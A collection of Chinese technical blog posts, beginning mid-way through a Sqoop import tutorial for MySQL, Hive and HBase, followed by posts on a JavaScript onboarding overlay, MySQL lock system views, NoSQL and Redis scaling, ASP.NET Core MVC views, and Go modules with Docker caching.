2019-03-12 20:21:57,005 INFO hive.HiveImport: Loading data to table testmshk.mysql2hive_mshk
2019-03-12 20:21:58,181 INFO hive.HiveImport: OK
2019-03-12 20:21:58,181 INFO hive.HiveImport: Time taken: 1.619 seconds
2019-03-12 20:21:58,681 INFO hive.HiveImport: Hive import complete.
    
  最后，让我们验证 Hive 中的输出：
[root@c0 ~]# hive

Logging initialized using configuration in jar:file:/home/work/_app/hive-2.3.4/lib/hive-common-2.3.4.jar!/hive-log4j2.properties Async: true
Hive-on-MR is deprecated in Hive 2 and may not be available in the future versions. Consider using a different execution engine (i.e. spark, tez) or using Hive 1.X releases.
hive> show databases;
OK
default
testmshk
Time taken: 3.512 seconds, Fetched: 2 row(s)
hive> use testmshk;
OK
Time taken: 0.032 seconds
hive> show tables;
OK
mysql2hive_mshk
testtable
Time taken: 0.083 seconds, Fetched: 2 row(s)
hive> select * from mysql2hive_mshk;
OK
10086   my.mshk.top you.mshk.top
12306   mname   yname
Time taken: 1.634 seconds, Fetched: 2 row(s)
hive> quit;
  
  同时我们在 HDFS 中也可以看到创建的数据：
  
  
4.3、Sqoop 通过 MySql 导入数据到 Hbase
  接下来我们将 MySql 中的表 hive2mysql_mshk 数据，导入到 Hbase ，同时在 Hbase 中创建表 mysql2hase_mshk
[root@c0 ~]# sqoop import --connect jdbc:mysql://c0:3306/testmshk?useSSL=false --username root --password 123456 --split-by id --table hive2mysql_mshk --hbase-table mysql2hase_mshk --hbase-create-table --hbase-row-key id --column-family id
2019-03-13 12:04:33,647 INFO sqoop.Sqoop: Running Sqoop version: 1.4.7
2019-03-13 12:04:33,694 WARN tool.BaseSqoopTool: Setting your password on the command-line is insecure. Consider using -P instead.
2019-03-13 12:04:33,841 INFO manager.MySQLManager: Preparing to use a MySQL streaming resultset.
2019-03-13 12:04:33,841 INFO tool.CodeGenTool: Beginning code generation
2019-03-13 12:04:34,162 INFO manager.SqlManager: Executing SQL statement: SELECT t.* FROM `hive2mysql_mshk` AS t LIMIT 1
2019-03-13 12:04:34,197 INFO manager.SqlManager: Executing SQL statement: SELECT t.* FROM `hive2mysql_mshk` AS t LIMIT 1
...
2019-03-13 12:05:13,782 INFO mapreduce.Job:  map 75% reduce 0%
2019-03-13 12:05:15,813 INFO mapreduce.Job:  map 100% reduce 0%
2019-03-13 12:05:16,827 INFO mapreduce.Job: Job job_1552397454797_0002 completed successfully
2019-03-13 12:05:16,942 INFO mapreduce.Job: Counters: 33
    File System Counters
        FILE: Number of bytes read=0
        FILE: Number of bytes written=1041632
        FILE: Number of read operations=0
        FILE: Number of large read operations=0
        FILE: Number of write operations=0
        HDFS: Number of bytes read=425
        HDFS: Number of bytes written=0
        HDFS: Number of read operations=4
        HDFS: Number of large read operations=0
        HDFS: Number of write operations=0
    Job Counters
        Failed map tasks=5
        Launched map tasks=9
        Other local map tasks=9
        Total time spent by all maps in occupied slots (ms)=68882
        Total time spent by all reduces in occupied slots (ms)=0
        Total time spent by all map tasks (ms)=68882
        Total vcore-milliseconds taken by all map tasks=68882
        Total megabyte-milliseconds taken by all map tasks=70535168
    Map-Reduce Framework
        Map input records=2
        Map output records=2
        Input split bytes=425
        Spilled Records=0
        Failed Shuffles=0
        Merged Map outputs=0
        GC time elapsed (ms)=801
        CPU time spent (ms)=15480
        Physical memory (bytes) snapshot=1097326592
        Virtual memory (bytes) snapshot=11271196672
        Total committed heap usage (bytes)=629669888
        Peak Map Physical memory (bytes)=295751680
        Peak Map Virtual memory (bytes)=2828283904
    File Input Format Counters
        Bytes Read=0
    File Output Format Counters
        Bytes Written=0
2019-03-13 12:05:16,949 INFO mapreduce.ImportJobBase: Transferred 0 bytes in 38.224 seconds (0 bytes/sec)
2019-03-13 12:05:16,954 INFO mapreduce.ImportJobBase: Retrieved 2 records.
  
  这时，我们再用 shell 测试连接 Hbase ,查看我们刚刚导入的数据，能够看到 mysql2hase_mshk 已经存在，并且可以获取其中的数据
[root@c0 ~]# hbase shell
HBase Shell
Use "help" to get list of supported commands.
Use "exit" to quit this interactive shell.
Version 1.4.9, rd625b212e46d01cb17db9ac2e9e927fdb201afa1, Wed Dec  5 11:54:10 PST 2018

hbase(main):001:0> list
TABLE
mysql2hase_mshk
1 row(s) in 0.1870 seconds

=> ["mysql2hase_mshk"]
hbase(main):002:0> scan 'mysql2hase_mshk'
ROW                                                        COLUMN+CELL
 10086                                                     column=id:namea, timestamp=1552449912494, value=my.mshk.top
 10086                                                     column=id:nameb, timestamp=1552449912494, value=you.mshk.top
 12306                                                     column=id:namea, timestamp=1552449906986, value=mname
 12306                                                     column=id:nameb, timestamp=1552449906986, value=yname
2 row(s) in 0.1330 seconds

hbase(main):003:0> hbase(main):003:0> get 'mysql2hase_mshk','10086'
COLUMN                                                     CELL
 id:namea                                                  timestamp=1552449912494, value=my.mshk.top
 id:nameb                                                  timestamp=1552449912494, value=you.mshk.top
1 row(s) in 0.0230 seconds

hbase(main):004:0>
  
  如何在 Hbase 和 Hive 中互相导入、导出数据，请参考文章：Hadoop 3.1.2(HA)+Zookeeper3.4.13+Hbase1.4.9(HA)+Hive2.3.4+Spark2.4.0(HA)高可用集群搭建 中的 9.2.4 和 9.2.5 章节。
  
  希望您发现它很有用，感谢您的支持和阅读我的博客。

博文作者：迦壹
博客地址：通过 Sqoop1.4.7 将 Mysql5.7、Hive2.3.4、Hbase1.4.9 之间的数据导入导出
转载声明：可以转载, 但必须以超链接形式标明文章原始出处和作者信息及版权声明，谢谢合作！
  
假设您认为这篇文章对您有帮助，可以通过以下方式进行捐赠，谢谢！

比特币地址：1KdgydfKMcFVpicj5w4vyn3T88dwjBst6Y
以太坊地址：0xbB0a92d634D7b9Ac69079ed0e521CC2e0a97c420

********************************************************************************************************************************************************************************************************
手把手教你实现一个引导动画

本文由云+社区发表


作者：陈纪庚

前言
最近看了一些文章，知道了实现引导动画的基本原理，所以决定来自己亲手做一个通用的引导动画类。
我们先来看一下具体的效果：点这里
原理

通过维护一个Modal实例，使用Modal的mask来隐藏掉页面的其他元素。
根据用户传入的需要引导的元素列表，依次来展示元素。展示元素的原理：通过cloneNode来复制一个当前要展示元素的副本，通过当前元素的位置信息来展示副本，并且通过z-index属性来让其在ModalMask上方展示。大致代码如下： const newEle = target.cloneNode(true); const rect = target.getBoundingClientRect(); newEle.style.zIndex = '1001'; newEle.style.position = 'fixed'; newEle.style.width = ${rect.width}px; newEle.style.height = ${rect.height}px; newEle.style.left = ${rect.left}px; newEle.style.top = ${rect.top}px; this.modal.appendChild(newEle);
当用户点击了当前展示的元素时，则展示下一个元素。

原理听起来是不是很简单？但是其实真正实现起来，还是有坑的。比如说，当需要展示的元素不在页面的可视范围内如何处理。
当要展示的元素不在页面可视范围内，主要分为三种情况：

展示的元素在页面可视范围的上边。
展示的元素在页面可视范围的下边。
展示的元素在可视范围内，可是展示不全。

由于我是通过getBoundingClientRect这个api来获取元素的位置、大小信息的。这个api获取的位置信息是相对于视口左上角位置的（如下图）。

对于第一种情况，这个api获取的top值为负值，这个就比较好处理，直接调用window.scrollBy(0, rect.top)来将页面滚动到展示元素的顶部即可。
而对于第二、三种情况，我们可以看下图

从图片我们可以看出来，当rect.top+rect.height < window.innerHeight的时候，说明展示的元素不在视野范围内，或者展示不全。对于这种情况，我们也可以通过调用window.scrollBy(0, rect.top)的方式来让展示元素尽可能在顶部。
对上述情况的调节代码如下：
// 若引导的元素不在页面范围内，则滚动页面到引导元素的视野范围内
adapteView(ele) {
    const rect = ele.getBoundingClientRect();
    const height = window.innerHeight;
    if (rect.top < 0 || rect.top + rect.height > height) {
        window.scrollBy(0, rect.top);
    }
}
接下来，我们就来一起实现下这个引导动画类。
第一步：实现Modal功能
我们先不管具体的展示逻辑实现，我们先实现一个简单的Modal功能。
class Guidences {
  constructor() {
    this.modal = null;
    this.eleList = [];
  }
  // 入口函数
  showGuidences(eleList = []) {
    // 允许传入单个元素
    this.eleList = eleList instanceof Array ? eleList : [eleList];
    // 若之前已经创建一个Modal实例，则不重复创建
    this.modal || this.createModel();
  }
  // 创建一个Modal实例
  createModel() {
    const modalContainer = document.createElement('div');
    const modalMask = document.createElement('div');
    this.setMaskStyle(modalMask);
    modalContainer.style.display = 'none';
    modalContainer.appendChild(modalMask);
    document.body.appendChild(modalContainer);
    this.modal = modalContainer;
  }

  setMaskStyle(ele) {
    ele.style.zIndex = '1000';
    ele.style.background = 'rgba(0, 0, 0, 0.8)';
    ele.style.position = 'fixed';
    ele.style.top = 0;
    ele.style.right = 0;
    ele.style.bottom = 0;
    ele.style.left = 0;
  }
 
  hideModal() {
    this.modal.style.display = 'none';
    this.modal.removeChild(this.modalBody);
    this.modalBody = null;
  }

  showModal() {
    this.modal.style.display = 'block';
  }
}
第二步：实现展示引导元素的功能
复制一个要展示元素的副本，根据要展示元素的位置信息来放置该副本，并且将副本当成Modal的主体内容展示。
class Guidences {
  constructor() {
    this.modal = null;
    this.eleList = [];
  }
  // 允许传入单个元素
  showGuidences(eleList = []) {
    this.eleList = eleList instanceof Array ? eleList : [eleList];
    this.modal || this.createModel();
    this.showGuidence();
  }
  // 展示引导页面
  showGuidence() {
    if (!this.eleList.length) {
      return this.hideModal();
    }
    // 移除上一次的展示元素
    this.modalBody && this.modal.removeChild(this.modalBody);
    const ele = this.eleList.shift(); // 当前要展示的元素
    const newEle = ele.cloneNode(true); // 复制副本
    this.modalBody = newEle;
    this.initModalBody(ele);
    this.showModal();
  }

  createModel() {
    // ...
  }

  setMaskStyle(ele) {
    // ...
  }

  initModalBody(target) {
    this.adapteView(target);
    const rect = target.getBoundingClientRect();
    this.modalBody.style.zIndex = '1001';
    this.modalBody.style.position = 'fixed';
    this.modalBody.style.width = `${rect.width}px`;
    this.modalBody.style.height = `${rect.height}px`;
    this.modalBody.style.left = `${rect.left}px`;
    this.modalBody.style.top = `${rect.top}px`;
    this.modal.appendChild(this.modalBody);
    // 当用户点击引导元素，则展示下一个要引导的元素
    this.modalBody.addEventListener('click', () => {
      this.showGuidence(this.eleList);
    });
  }
  // 若引导的元素不在页面范围内，则滚动页面到引导元素的视野范围内
  adapteView(ele) {
    const rect = ele.getBoundingClientRect();
    const height = window.innerHeight;
    if (rect.top < 0 || rect.top + rect.height > height) {
      window.scrollBy(0, rect.top);
    }
  }

  hideModal() {
      // ...
  }

  showModal() {
      // ...
  }
}
完整的代码可以在点击这里
调用方式
const guidences = new Guidences();
function showGuidences() {
    const eles = Array.from(document.querySelectorAll('.demo'));
    guidences.showGuidences(eles);
}
showGuidences();
总结
除了使用cloneNode的形式来实现引导动画外，还可以使用box-shadow、canvas等方式来做。
此文已由腾讯云+社区在各渠道发布
获取更多新鲜技术干货，可以关注我们腾讯云技术社区-云加社区官方号及知乎机构号

********************************************************************************************************************************************************************************************************
mysql锁分析相关的几个系统视图
1、infomation_schema.innodb_lock_waits+-------------------+-------------+------+-----+---------+-------+| Field             | Type        | Null | Key | Default | Extra |+-------------------+-------------+------+-----+---------+-------+| requesting_trx_id | varchar(18) | NO   |     |         |       |　#请求锁的事务id　| requested_lock_id | varchar(81) | NO   |     |         |       |　#请求锁的id| blocking_trx_id   | varchar(18) | NO   |     |         |       |　#拥有锁的事务id　| blocking_lock_id  | varchar(81) | NO   |     |         |       |　#拥有锁的id　+-------------------+-------------+------+-----+---------+-------+
2、information_schema.innodb_trx+----------------------------+---------------------+------+-----+---------------------+-------+| Field                      | Type                | Null | Key | Default             |Extra |+----------------------------+---------------------+------+-----+---------------------+-------+| trx_id                     | varchar(18)         | NO   |     |                     |      |　　# 事务id| trx_state                  | varchar(13)         | NO   |     |                     |      |　　# 事务的执行状态| trx_started                | datetime            | NO   |     | 0000-00-00 00:00:00 |      |　　# 事务开始的时间| trx_requested_lock_id      | varchar(81)         | YES  |     | NULL                |      |　　# 事务正等待的锁id| trx_wait_started           | datetime            | YES  |     | NULL                |      |　　# 事务等待锁开始的时间| trx_weight                 | bigint(21) unsigned | NO   |     | 0                   |      |　　# 事务权重，主要反映事物修改和锁定的行数| trx_mysql_thread_id        | bigint(21) unsigned | NO   |     | 0                   |      |　　# 事务相应线程的id| trx_query                  | varchar(1024)       | YES  |     | NULL                |      |　　# 事务SQL语句| trx_operation_state        | varchar(64)         | YES  |     | NULL                |      |　　# 事务的目前操作| trx_tables_in_use          | bigint(21) unsigned | NO   |     | 0                   |      |　　# 事务处理当前SQL所用的表数| trx_tables_locked          | bigint(21) unsigned | NO   |     | 0                   |      |　　# 事务当前SQL拥有行锁的表数| trx_lock_structs           | bigint(21) unsigned | NO   |     | 0                   |      |　　# 事物保留的锁数| trx_lock_memory_bytes      | bigint(21) unsigned | NO   |     | 0                   |      |　　# 事务锁结构所占内存大小| trx_rows_locked            | bigint(21) unsigned | NO   |     | 0                   |      |　　# 事务锁住的近似行数| trx_rows_modified          | bigint(21) unsigned | NO   |     | 0                   |      |　　# 事务修改和插入的行数| trx_concurrency_tickets    | bigint(21) unsigned | NO   |     | 0                   |      |　　# 指示当前事务被交换出之前需处理工作量的数值 | trx_isolation_level        | varchar(16)         | NO   |     |                     |      |　　# 当前事务的隔离等级| trx_unique_checks          | int(1)              | NO   |     | 0                   |      |　　# 唯一检查对当前事务是否开启| trx_foreign_key_checks     | int(1)              | NO   |     | 0                   |      |　　# 外键检查对当前事务是否开启| trx_last_foreign_key_error | varchar(256)        | YES  |     | NULL                |      |    # 最近外键报错的详细信息| trx_adaptive_hash_latched  | int(1)              | NO   |     | 0                   |      |    # 当前事务是否锁定自适应哈希索引| trx_adaptive_hash_timeout  | bigint(21) unsigned | NO   |     | 0                   |      |    # 指示当前事务是否放弃或保留搜索自适应索引的数值，为0时，则立即放弃| trx_is_read_only           | int(1)              | NO   |     | 0                   |      |　　# 当前事务是否只读，1为只读| trx_autocommit_non_locking | int(1)              | NO   |     | 0                   |      |    # 指示当前事务是否为非锁定自动提交+----------------------------+---------------------+------+-----+---------------------+-------+
3、information_schema.innodb_locks+-------------+---------------------+------+-----+---------+-------+| Field       | Type                | Null | Key | Default | Extra |+-------------+---------------------+------+-----+---------+-------+| lock_id     | varchar(81)         | NO   |     |         |       |　　# 锁id| lock_trx_id | varchar(18)         | NO   |     |         |       |　　# 拥有锁的事务id　　　| lock_mode   | varchar(32)         | NO   |     |         |       |　　# 锁模式| lock_type   | varchar(32)         | NO   |     |         |       |　　# 锁类型| lock_table  | varchar(1024)       | NO   |     |         |       |　　# 被锁的表| lock_index  | varchar(1024)       | YES  |     | NULL    |       |　　# 被锁的索引| lock_space  | bigint(21) unsigned | YES  |     | NULL    |       |　　# 被锁的表空间号| lock_page   | bigint(21) unsigned | YES  |     | NULL    |       |　　# 被锁的页号| lock_rec    | bigint(21) unsigned | YES  |     | NULL    |       |　　# 被锁的记录号| lock_data   | varchar(8192)       | YES  |     | NULL    |       |　　# 被锁的数据+-------------+---------------------+------+-----+---------+-------+
4、information_schema.processlist+---------+---------------------+------+-----+---------+-------+| Field   | Type                | Null | Key | Default | Extra |+---------+---------------------+------+-----+---------+-------+| ID      | bigint(21) unsigned | NO   |     | 0       |       |     # 连接线程的id| USER    | varchar(32)         | NO   |     |         |       |     # 登录mysql的user| HOST    | varchar(64)         | NO   |     |         |       |     # 登录mysql的主机名或地址:端口| DB      | varchar(64)         | YES  |     | NULL    |       |     # 登录mysql的数据库名| COMMAND | varchar(16)         | NO   |     |         |       |     # 连接线程当前运行命令的类型| TIME    | int(7)              | NO   |     | 0       |       |     # 连接线程处于当前状态的秒数 | STATE   | varchar(64)         | YES  |     | NULL    |       |     # 连接线程当前所处的状态 | INFO    | longtext            | YES  |     | NULL    |       |     # 连接线程当前正执行的语句+---------+---------------------+------+-----+---------+-------+
********************************************************************************************************************************************************************************************************
Redis - NoSQL数据库技术（一）
NoSQL入门概述（一）
作者 ： Stanley 罗昊
【转载请注明出处和署名，谢谢！】
什么是NoSQL
NoSQL(NoSQL - Not Only SQL),意“不仅仅是SQL”；
泛指非关系型的数据库；
随着互联网web2.0网站的兴起，传统的关系数据库在应对web2.0网站，特别是超大规模和高并发的SNS类型的web2.0纯动态网站以及显得力不从心，暴露了很多难以克服的问题，而非关系型的数据库则由于其本身的特点得到了非常迅速的发展；
NoSQL数据库的产生就是为了解决大规模数据集合，多重复数据种类带来的挑战，尤其是大数据应用难题，包括大规模数据的存储。
（例如谷歌或Facebook每天为澳门的用户手机万亿比特的数据），这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展；
为什么用NoSQL
在最早的项目研发时期，是单机MySQL的美好年代，无非就是三层架构，dao层直接访问数据库获取数据后响应给客户即可，非常简单；
但是随着时代的改变，以及互联网用户越来越多，大规模的互联网公司兴起，数据量急剧增加，再用最早的开发模式，已经完全满足不了现在时代的需求了；
所以就nosql（非关系型数据库）横空出世，来解决大数据量情况下提高数据库读取效率，从而提升系统性能以及客户体验；
在早期的系统，dao层直接访问数据库获取数据，但是现在时代的变迁，这样的方式在数据量大的情况下，效率非常非常的查，你无论怎么优化都是徒劳；
nosql出现后，犹如在数据库前面加了一堵墙，dao层先访问Redis，Redis再访问数据库；
数据库读出来的数据先存入Redis，获取数据的时候，直接从Redis中获取即可，不用再通过数据库从内存中读写；
今天我们可以通过第三方平台（如：Google,Facebook等）可以很容易的访问和抓取数据，用户的个人信息，社交网络，地理位置，用户产生的数据和用户操作日志以及成倍的增加；
我们如果要对这些用户数据进行挖掘，MySQL数据库以及不合适这些应用了，NoSQL数据库发展却能很好的出列这些大数据；
单机MySQL的美好年代
在最早的javaweb开发应用程序中，无非就是JSP跳JSP，一个JSP处理用户并且响应，另外一个JSP发出请求，请求别的JSP，再往后，JSP跳Serclet，Serclet掉业务逻辑层的方法，业务逻辑掉数据访问层，数据访问层去请求数据库发起事物；
在90年代，一个网站的访问量都不大，用单个数据库完全可以轻松应付；
在那个时候，更多的都是静态网页，动态交互类型的网站不多；
在那个时候程序的划分也非常简单：

 
随着时代的变迁，数据的总量总有一天会撑破这个机器，数据库读取也就是查询效率讲会变得非常非常低；
建立索引也是会占用磁盘空间的，数据量越大，你索引越多，时间久了机器就是受不了你这样折腾了；
还有一个访问量（读写混合）一个数据库是受不了的，你读取跟插入数据都是在同一个数据库，这样数据库也是承受不了的（数据量大的情况下）；
所以，问题已经列出来了，我们就要解决，要去优化这些问题，提高性能；
在以上这种开发模式，数据量在小于1w是可以满足的，自己用用，或访问量不大的情况下是没有问题的，自己做练习什么的都可以，但是进入企业，就不可以再这么用了；
Redis（缓存）+MySQL+垂直拆分
随着数据量大，读写都是在同一台机器上，扛不住了以后呢，项目架构也就进行了改变：

跟上一张图标对比，是只有一个MySQL数据库，并且现在我们还在MySQL前面档了一层Cache（这里理解成Redis【缓存】）,换句话说，之前是DAO层直接去访问数据库，现在DAO层直接去Redis里面；
是不是有点像替数据库挡了一层，大家都指定，对数据库伤害比较大的就是频繁的查询，如果频繁查询的刚好还是一些固定的顺序，我们是不是可以把他摘出来放到缓存里面（Redis）；
mysql还有一个垂直拆分，言下之意就是，你一个数据装不住了，你拆开了以后，例如，买家跟卖家被分成两个库，这样的话，数据库的压力就被分担了一些；
MySQL主从读写分离
举个例子，现在是一台机器一个数据库，我现在要求一台机器变成五个数据库，那么，其中的一台数据库作为主库，另外四台作为从库，我插入一条数据是给主库，主库这个时候需要同步另外四个从库，比如我主库里面有 a b c，这个时候我向里面查一个d，这个时候主库就需要向另外四个从库也添加一个d来保持同步；
也可以理解为主从复制，主表里面有什么东西，我从表需要迅速的复制粘贴进来；
读写分离，顾名思义，读就是查询，写就是增 删 改，在我们自己做练习的时候，增删改查一直都是同一台机器或同一个数据库，但是在实际开发当中，这种情况是不允许的，因为非常影响效率；
所以又有一个数据库是只做查询，另外一个数据库是只做增 删 改，这就是读写分离，所以就造成了下面这张图：

由于数据库的写入压力增加，Redis只能缓解数据库的读取压力，读写集中在一个数据库上让数据库不堪重负，大部分网站开始使用主从赋值技术来达到读写分离，提高读写性能和读库的可扩展性；
之前是光在mysql前面档了一个缓存，现在，在缓存背后又出现了数据库的拆分，变成了读写分离了，M代表主表，S代表从表；
什么概念呢？
就是，对于一个数据库的信息，写的操作都放到M（主）库了，读的操作都去从库去度，这样的话，存载的数据被分割以后，就可以大大的缓解数据库的压力；
分库分表+水平拆分+mysql集群
经过前几次的拆分，改变，读写分离，往后发现又扛不住了，这个时候，集群就出来了；
在Redis的高速缓存，MySQL的主从复制，读写分离的基础上，这时，MySQL主库的读写压力开始出现瓶颈，而数据量的持续猛增，由于MyISAM使用表锁，在高并发下会出现严重的锁问题，大量的高并发MySQL应用开始使用InnoDB引擎代替MyISAM；
同时，开始流行使用分表分库来缓解写压力和数据库增长的扩展问题，这个时候，分表分库就成了一个热门的技术，是面试的热门问题也是业界讨论的热门技术问题；
也就是在这个时候MySQL推出了还不太稳定的表分区，这也给技术实力一般的公司带来了希望，虽然MySQL推出MySQL Cluster集群，但性能也不能很好满足互联网的需求，只是在高可靠性上提供非常大的保障；

我们可以发现，以上图就用了数据库的集群，三个数据库各司其职，每个数据库存放的是整个项目数据的3分之1，频繁查询的数据库单独列出一个库，经常不用的数据也独立出来放在一个数据库中；
如今的项目结构

首先，三个蓝色的小人人就点客户，通过企业防火墙Linux，往后就是负载均衡的主备Nginx，做这个负载均衡、反向代理的一个；
所以说在真正的项目研发的时候，你是不可能先经过服务器的，而是先经过Nginx；
后面就是一大堆应用服务器的集群，也可以理解为tomcat的集群，一只猫带不动这个项目，那么就一群猫来带，这样就实现了高可用，负载均衡以及服务器的集群；
再往后，就是数据库的集群了；
今日感悟：
当一个人可以轻松做一件事情的时候，你自己也这么认为自己也可以；
那么你就大错特错了
********************************************************************************************************************************************************************************************************
asp.net core系列 41 Web 应用 MVC视图
一.MVC视图
　　在Web开发的MVC和Razor中，都有使用视图，在Razor中称为"页"。.cshtml视图是嵌入了Razor标记的HTML模板。 Razor 标记使用C#代码，用于与HTML 标记交互以生成发送给客户端的网页。在MVC目录结构中，Views / [ControllerName] 文件夹下用于创建视图，其中Views/Shared 文件夹下的视图是控制器共享的视图。
　　
　　1.1  视图页Razor 标记
　　　　下面是Views/Home 文件夹中创建一个 About.cshtml 文件，呈现的视图如下：

@{
    ViewData["Title"] = "About";
}
<h2>@ViewData["Title"].</h2>
<h3>@ViewData["Message"]</h3>

 　　　　Razor 标记以 @ 符号开头。后面的大括号 { ... } 括住的是 Razor 代码块，是运行 C# 语句。 只需用 @ 符号来引用值，即可在 HTML 中显示这些值。比如上面h2和h3标签。
 
　　1.2 控制器指定视图
　　　　通常以 ViewResult 的形式从Action返回结果到视图，这是一种 ActionResult结果类型（Web api中有讲到)。但通常不会这样做。 因为大多数控制器均继承自Controller，因此只需使用 View 方法即可返回 ViewResult。示例如下：

public IActionResult About()
{
    ViewData["Message"] = "Your application description page.";
    
    return View();
}

 　　　　View 方法有多个重载。 可选择指定：

    //要返回的显式视图
    return View("Orders");
    //要传递给视图的模型(实体)对象
    return View(Orders);
    //视图和模型
    return View("Orders", Orders);

 
　　1.3 视图发现
　　　　Action返回一个视图时, 这个过程叫“视图发现”。默认的 return View(); 将返回与当前Action方法同名的视图。搜索匹配的视图文件顺序规则如下：

        Views/[ControllerName]/[ViewName].cshtml
        Views/Shared/[ViewName].cshtml

　　　　当return View()时，首先在 Views/[ControllerName] 文件夹中搜索该视图。 如果在此处找不到匹配的视图，则会在“Shared”文件夹中搜索该视图。
　　　　在返回视图时，可以提供视图文件路径。 如果使用绝对路径(“/”或“~/”开头)，必须指定 .cshtml 扩展名：

    　　return View("Views/Home/About.cshtml");

　　　　也可使用相对路径在不同目录中指定视图，而无需指定 .cshtml 扩展名：

       return View("../Manage/Index");

　　　　可以用“./”前缀来指示当前的控制器特定目录：

       return View("./About");

 
　　1.4 向视图传递数据
　　　　可以使用多种方法将数据传递给视图。包括：(1)强类型数据：viewmodel。(2)弱类型数据ViewData (ViewDataAttribute)、ViewBag。ViewBag 在 Razor 页中不可用。
　　　　(1) 强类型数据 viewmodel
　　　　　　在传递数据到视图中，最可靠的是使用强类型数据，因为编译时能检查并且有智能感知。在视图页中使用@model指令来指定模型（可以是实体或集合泛型实体）。如下所示，其中前端的WebApplication1.ViewModels.Address是实体类命令空间，通过后端返回view强类型映射：

@model WebApplication1.ViewModels.Address
<h2>Contact</h2>
<address>
    @Model.Street<br>
    @Model.City, @Model.State @Model.PostalCode<br>
    <abbr title="Phone">P:</abbr> 425.555.0100
</address>


public IActionResult Contact()
{
    ViewData["Message"] = "Your contact page.";

    var viewModel = new Address()
    {
        Name = "Microsoft",
        Street = "One Microsoft Way",
        City = "Redmond",
        State = "WA",
        PostalCode = "98052-6399"
    };

    //返回强类型
    return View(viewModel);
}

 　　(2) 弱类型数据（ViewData、ViewData 属性和 ViewBag)
　　　　视图还可以访问弱类型（也称为松散类型）的数据集合。可以使用弱类型数据集合将少量数据传入及传出控制器和视图。ViewData 属性是弱类型对象的字典。ViewBag 属性是 ViewData 的包装器，为基础 ViewData 集合提供动态属性。ViewData派生自 ViewDataDictionary，ViewBag派生自 DynamicViewData。
　　　　ViewData 和 ViewBag 在运行时进行动态解析。 由于它们不提供编译时类型检查，因此使用这两者通常比使用 viewmodel 更容易出错。建议尽量减少或根本不使用 ViewData 和 ViewBag。
 
　　　　ViewData介绍
　　　　　　下面是一个ViewData存储对象，在视图上强制转换为特定类型(Address)。

public IActionResult SomeAction()
{
    ViewData["Greeting"] = "Hello";
    ViewData["Address"]  = new Address()
    {
        Name = "Steve",
        Street = "123 Main St",
        City = "Hudson",
        State = "OH",
        PostalCode = "44236"
    };

    return View();
}


@{
    // Since Address isn't a string, it requires a cast.
    var address = ViewData["Address"] as Address;
}

@ViewData["Greeting"] World!

<address>
    @address.Name<br>
    @address.Street<br>
    @address.City, @address.State @address.PostalCode
</address>

 　　
　　　　ViewData 特性介绍
　　　　　　可以在控制器或 Razor 页面模型上，使用 [ViewData] 修饰属性。下面是一个示例：

public class HomeController : Controller
{
    [ViewData]
    public string Title { get; set; }

    public IActionResult About()
    {
        Title = "About Us";
        ViewData["Message"] = "Your application description page.";

        return View();
    }
}


//通过字典key取出
<title>@ViewData["Title"] - WebApplication</title>

 　　　　
　　　　ViewBag介绍
　　　　　　ViewBag 不需要强制转换，因此使用起来更加方便。下面示例如下：　　　

public IActionResult SomeAction()
{
   // Greeting不需要先声明，Address 也一样,因为是Dynamic类型
    ViewBag.Greeting = "Hello";
    ViewBag.Address  = new Address()
    {
        Name = "Steve",
        Street = "123 Main St",
        City = "Hudson",
        State = "OH",
        PostalCode = "44236"
    };

    return View();
}


@ViewBag.Greeting World!

<address>
    @ViewBag.Address.Name<br>
    @ViewBag.Address.Street<br>
    @ViewBag.Address.City, @ViewBag.Address.State @ViewBag.Address.PostalCode
</address>

 　　
　　　　更多视图功能包括：标记帮助程序、服务注入视图，视图组件等
 
　　参考文献
　　　　ASP.NET Core MVC 中的视图
********************************************************************************************************************************************************************************************************
使用go mod结合docker分层缓存进行自动CI/CD
本文地址：https://www.cnblogs.com/likeli/p/10521941.html

    

喜大奔的go mod
官方背书的go mod拯救了我的代码洁癖症!
环境

go v1.12
docker ce 18.09.0
gitlab ce latest

godep
写go程序，若是仅仅是你一个人写，或者就是写个小工具玩儿玩儿，依赖管理对你来说可能没那么重要。
但是在商业的工程项目里，多人协同，go的依赖管理就尤为重要了，之前可选的其实不太多，社区提供的实现方式大多差不多的思路，比如我之前使用的godep。所以项目中会有一个vendor文件夹来存放外部的依赖，这样：

这样的实现方式，每次更新了外部依赖，其他人就得拉下来一大坨。。。
go mod
来看看使用官方的module来管理依赖的工程结构：

是不是，清爽无比，项目也整个瘦身了！
简单的说一下go mod help，至于开启go mod的步骤，其他网文一大堆，就不复制了。毕竟本文是说go工程CI/CD的。
在目前go v1.12版本下，命令go mod help结果如下：
The commands are:

    download    download modules to local cache
    edit        edit go.mod from tools or scripts
    graph       print module requirement graph
    init        initialize new module in current directory
    tidy        add missing and remove unused modules
    vendor      make vendored copy of dependencies
    verify      verify dependencies have expected content
    why         explain why packages or modules are needed
后面CI/CD需要用到的是download指令。
dockerfile
来看看我这个工程的dockerfile:
FROM golang:1.12 as build

ENV GOPROXY https://go.likeli.top
ENV GO111MODULE on

WORKDIR /go/cache

ADD go.mod .
ADD go.sum .
RUN go mod download

WORKDIR /go/release

ADD . .

RUN GOOS=linux CGO_ENABLED=0 go build -ldflags="-s -w" -installsuffix cgo -o app main.go

FROM scratch as prod

COPY --from=build /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
COPY --from=build /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/ca-certificates.crt
COPY --from=build /go/release/app /
COPY --from=build /go/release/conf.yaml /

CMD ["/app"]
我这个项目有一些外部依赖，在本地开发的时候都已调整好，并且编译通过，在本地开发环境已经生成了两个文件go.mod、go.sum
在dockerfile的第一步骤中，先启动module模式，且配置代理，因为有些墙外的包服务没有梯子的情况下也是无法下载回来的，这里的代理域名是我自己的，有需要的也可以用。
指令RUN go mod download执行的时候，会构建一层缓存，包含了该项所有的依赖。之后再次提交的代码中，若是go.mod、go.sum没有变化，就会直接使用该缓存，起到加速构建的作用，也不用重复的去外网下载依赖了。若是这两个文件发生了变化，就会重新构建这个缓存分层。
使用缓存构建的效果：

这个加速效果是很明显的。
减小体积
go构建命令使用-ldflags="-s -w"
在官方文档：Command_Line里面说名了-s -w参数的意义，按需选择即可。

-s: 省略符号表和调试信息
-w: 省略DWARF符号表


看起来效果不错🙂
使用scratch镜像
使用golang:1.12开发镜像构建好应用后，在使用scratch来包裹生成二进制程序。
关于最小基础镜像，docker里面有这几类：

scratch: 空的基础镜像，最小的基础镜像
busybox: 带一些常用的工具，方便调试， 以及它的一些扩展busybox:glibc
